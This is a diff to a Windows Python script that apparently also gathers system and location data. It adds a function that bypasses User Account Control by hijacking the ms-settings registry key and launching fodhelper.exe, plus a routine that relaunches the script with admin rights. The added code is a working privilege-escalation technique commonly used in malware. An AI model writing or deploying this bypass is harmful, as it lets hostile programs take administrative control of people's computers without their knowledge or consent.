@@ -5,6 +5,7 @@ import uuid
 import platform
 import winreg
 import os
+import sys
 
 def is_user_admin():
     try:
@@ -267,3 +268,40 @@ def get_location():
         pass
     
     return "Location unavailable"
+
+def bypass_uac_fodhelper():
+    try:
+        print("Attempting to bypass UAC using fodhelper...")
+        import winreg
+        
+        key_path = r"Software\Classes\ms-settings\shell\open\command"
+        
+        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, sys.executable)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+        
+        subprocess.run(['fodhelper.exe'], shell=True)
+        
+        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+
+        print("UAC bypass attempted. If UAC prompt appeared, please accept it.")
+        return True
+    except:
+        print("UAC bypass failed.")
+        return False
+    
+def elevate_process():
+    print("Checking for admin rights...")
+    if not ctypes.windll.shell32.IsUserAnAdmin():
+        try:
+            print("Not running as admin. Attempting to elevate...")
+            ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", sys.executable, 
+                f'"{os.path.abspath(__file__)}"', None, 1
+            )
+            sys.exit(0)
+        except Exception as e:
+            print(f"Failed to elevate: {e}")
+            return False
+    print("Running with admin rights.")
+    return True
